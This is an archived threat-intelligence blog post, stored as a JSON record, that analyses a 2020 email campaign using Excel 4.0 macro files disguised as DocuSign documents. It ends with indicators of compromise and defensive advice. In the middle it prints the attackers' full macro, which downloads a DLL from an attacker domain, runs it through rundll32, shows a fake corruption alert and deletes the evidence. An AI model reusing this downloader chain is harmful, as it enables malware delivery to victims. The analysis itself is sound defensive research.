{
    "id": "111ca166-8dee-4b49-8551-bf49bd51ccb2",
    "created_at": "2023-01-12T15:10:34.427643Z",
    "updated_at": "2025-03-27T02:14:34.17292Z",
    "deleted_at": null,
    "sha1_hash": "42a3392badf6cf98d8506eb98a0b191165861afc",
    "title": "2020-03-13 - Yet Another Active Email Campaign With Malicious Excel Files Identified",
    "authors": "",
    "file_creation_date": "2022-05-28T21:38:03Z",
    "file_modification_date": "2022-05-28T21:38:03Z",
    "file_size": 113526,
    "plain_text": "# Yet Another Active Email Campaign With Malicious Excel Files Identified\n\n**web.archive.org/web/20200929145931/https://www.comae.com/posts/2020-03-13_yet-another-active-email-campaign-**\nwith-malicious-excel-files-identified/\n\nPosted by Matt Suiche | Published on March 13, 2020\n\nCategories: `malware` `threat intelligence`\nTags: `CALCGANG`\n\nReading time: 3 minutes.Table Of Contents:\nWe identified a potential campaign in preparation where the victim would receive a zip file\ncontaining a Malicious Excel file embedding Excel 4.0 Macros — requiring user interaction to\n[infect the victim. We believe this is the same group as the one we discussed in February due](https://web.archive.org/web/20200929145931/https://www.comae.com/posts/2020-02-22_active-email-campaign-identified-with-malicious-excel-files/)\nto high similiarities in the modus operandi. This time again, the downloaded DLL would run\ncalc.exe&mldr;\n\nDue to the focus on running the Windows Calculator ( calc.exe ) by the group which seems\nto be preparing a campaign, we decided to call this group the `CALCGANG . The new stage of`\nthis campaign seems to have started on March 5, 2020.\n\nimage\n\n## Malicious Excel File Impersonating DocuSign\n\nThe chain works as the following:\n\nVictim receives a compressed archive (.xls.zip) file.\nOnce opened, the .xls file asks the user to enable macros to allow the document to\nconnect to a remote server to send a web request that returns back the malicious\nmacros to be executed. This is quiet ingenious as it allows some degree of flexibility to\nthe attacker — but also to evade traditional detection since the malicious macros would\nnot be inside the file.\n\nThe document pretends to be a DocuSign image.\nMalicious macro downloads a dll which gets executed with `regsvr32`\nWeirdly enough, the dll that gets downloaded is a 32-bits dll which __spawnvpe()\nWindows’s Calculator application.\n\nimage\n\n## The sample in question was not present on VirusTotal.\n\n\n-----\n\nWe found that the distributing domains are hosted on Alibaba Cloud. Details are provided at\nthe end of the blog-post. New domains were registered on Mach 5, 2020.\n\nimage\n\n## Web Query Dynamically Retrieving the DLL\n\nOnce the Web Query gets executed, the following macro will be returned to be executed by\nMicrosoft Excel. Unlike, the February version this one seems slightly more complicated but\nworks the same way.\n```\nFOPEN(R[8]C[-2],3)\n=FWRITELN(R[-1]C,\"Dim WinHttpReq, oStream\")\n=FWRITELN(R[-2]C,\"Set WinHttpReq = CreateObject(\"\"MSXML2.ServerXMLHTTP.6.0\"\")\")\n=FWRITELN(R[-3]C,\"WinHttpReq.setOption(2) = 13056\")\n=FWRITELN(R[-4]C,\"WinHttpReq.Open \"\"GET\"\", \"\"https://pjtcdnrd.pw/DVnsdvisdv\"\",\nFalse\")\n=FWRITELN(R[-5]C,\"WinHttpReq.setRequestHeader \"\"User-Agent\"\", \"\"Mozilla/4.0\n(compatible; MSIE 6.0; Windows NT 5.0)\"\"\")\n=FWRITELN(R[-6]C,\"WinHttpReq.Send\")\n=FWRITELN(R[-7]C,\"If WinHttpReq.Status = 200 Then\")\n=FWRITELN(R[-8]C,\"Set oStream = CreateObject(\"\"ADODB.Stream\"\")\")\n=FWRITELN(R[-9]C,\"oStream.Open\")\n=FWRITELN(R[-10]C,\"oStream.Type = 1\")\n=FWRITELN(R[-11]C,\"oStream.Write WinHttpReq.ResponseBody\")\n=FWRITELN(R[-12]C,\"oStream.SaveToFile \"\"\"&R[-5]C[-2]&\"\"\", 2\")\n=FWRITELN(R[-13]C,\"oStream.Close\")\n=FWRITELN(R[-14]C,\"End If\")\n=FCLOSE(R[-15]C)\n=EXEC(\"explorer.exe \"&R[-8]C[-2]&\"\")\n=WAIT(NOW()+\"00:00:05\")\n=ALERT(\"The workbook cannot be opened or repaired by Microsoft Excel because it is\ncorrupt.\",2)\n=FOPEN(R[-10]C[-2],3)\n=FWRITELN(R[-1]C,\"Set obj = GetObject(\"\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\"\")\")\n=FWRITELN(R[-2]C,\"obj.Document.Application.ShellExecute \"\"rundll32.exe\"\",\"\"\n\"&R[-14]C[-2]&\",DllRegisterServer\"\",\"\"C:\\Windows\\System32\"\",Null,0\")\n=FCLOSE(R[-3]C)\n=EXEC(\"explorer.exe \"&R[-14]C[-2]&\"\")\n=FILE.DELETE(R[-16]C[-2])\n=CLOSE(FALSE)\n\n## Malicious Macro Code\n\n```\nIt is unclear at this point if the attackers are just doing some scoping & testing on an\nupcoming campaign.\n\nimage\n\n## Malicious DLL executing __spawnvpe( calc )\n\n\n-----\n\nimage\n\n## RSDS Section\n\nOriginal DLL name appears to be calc.dll, according to the PDB Debugging Path String\n\n```\nC:\\Cigital\\Tools\\calc_security_poc\\dll\\dll\\Release\\calc.pdb\n\n```\n\n[The dll code looks very similar to another dll available on available on GitHub. Just like last](https://web.archive.org/web/20200929145931/https://github.com/arntsonl/calc_security_poc/blob/master/dll/main.cpp)\nmonth, it seems that the CALCGANG loves to use publicly available examples for their tests.\n\nThis could be that attackers are in training and learning how to spam and infect victims, or\nalso that those servers will be rotated with more malicious contents. It is also unclear if this\n[campaign is connected to Dudear.](https://web.archive.org/web/20200929145931/https://twitter.com/msftsecintel/status/1222995256540454912?lang=en)\n\nimage\n\n## VirusTotal and the DLL\n\nDetection on VirusTotal is still pretty low (non existent) at the time of writing the article.\n\nAt the time of writing this article another security researcher also noticed that the `CALCGANG`\nstarted to used DocuSign for their documents:\n\nMarch 4th they switched from Office image lure to DocuSign. Break from campaign\nMarch 7 - 11. Post-infection: copy of .dll dropped in %APPDATA%\\random\\.\nPersistence: Run key -> rundll32.exe %APPDATA%\\random\\*.dll,DllRegisterServer.\nSometimes I get a follow-up hvnc drop.\n\n[— Malware Breakdown (@DynamicAnalysis) March 13, 2020](https://web.archive.org/web/20200929145931/https://twitter.com/DynamicAnalysis/status/1238522771287805952?ref_src=twsrc%5Etfw)\n\nAnother interesting fact is that it seems that several files containing the domain name have\nbeen dropped in CrowdStrike Falcon Sandbox (Hybrid Analysis) since the creation of the\ndomain name - but it does not seem to be detected at all by any vendors.\n\nimage\n\n### Key Recommendations:\n\nDo not enable macros on files from unknown senders\nAlways be suspicious of legacy office files such as .XLS, .DOC or .RTF.\nMake sure to have memory analysis as part of your incident response strategy to\ndetect and assess potential infections on hosts. We can help you with our automated\nplatform and utilities.\n[Consider using Application Guard for Microsoft Office.](https://web.archive.org/web/20200929145931/https://www.bleepingcomputer.com/news/security/office-365-users-get-automated-protection-from-malicious-docs/#.XkRF5lEgM4o.twitter)\n\n### Indicator of compromise (IoC):\n\n\n-----\n\n**Excel File Hashes:**\n\n```\nB62CC06350B71F22363E2A7AC0A1E8389CA39DF08C60A41E27D60124D24EE2A1\n\n```\n\n[Additional hashes from Hybrid Analysis:](https://web.archive.org/web/20200929145931/https://www.hybrid-analysis.com/string-search/results/3dc70036a71e35bbd802c98fee48f9c94e928d59607cd7f27519389076e98e1e)\n```\nc443f2defea919d292e429ab4a78cd243bb6d588a0b6043d3026a62108f9fd62\n92db28d09178a32a5a306726a17c8f0734daa873d63f05cf1eb6037027e4f436\n38b6637c82246df63eb8312f425704979c3eab1977d668d9bbeaa67242e8d56f\n56095222c95b61a3a4ad7cafb24b369721f36434bff6011a0d4d36bcb5c49440\n2025dbd77e2b689fb2325cab54ea8c25fbd5c4d65e12ff4451de94f476c2bf76\n\n```\n\n**Malicious DLL**\n\n```\nC25812F5C1B6F74EC686A928461601C305DA29E6C36BBDCE0637CC44D30F2C19\n\n```\n\n**Domain Names & Servers:**\n\nDomains are sharing a common IP address, and to are hosted in Alibaba Cloud.\n```\n   pjtcdnrd.pw (Registered On 2020-03-05)\n   161.117.177.248\n\n### Related\n\n```\n[February 22, 2020 - Active Email Campaign Identified With Malicious Excel Files](https://web.archive.org/web/20200929145931/https:/www.comae.com/posts/2020-02-22_active-email-campaign-identified-with-malicious-excel-files/)\n\n```\nCALCGANG\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-13 - Yet Another Active Email Campaign With Malicious Excel Files Identified.pdf"
    ],
    "report_names": [
        "2020-03-13 - Yet Another Active Email Campaign With Malicious Excel Files Identified.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536234,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653773883,
    "ts_modification_date": 1653773883,
    "files": {
        "pdf": "https://archive.orkl.eu/42a3392badf6cf98d8506eb98a0b191165861afc.pdf",
        "text": "https://archive.orkl.eu/42a3392badf6cf98d8506eb98a0b191165861afc.txt",
        "img": "https://archive.orkl.eu/42a3392badf6cf98d8506eb98a0b191165861afc.jpg"
    }
}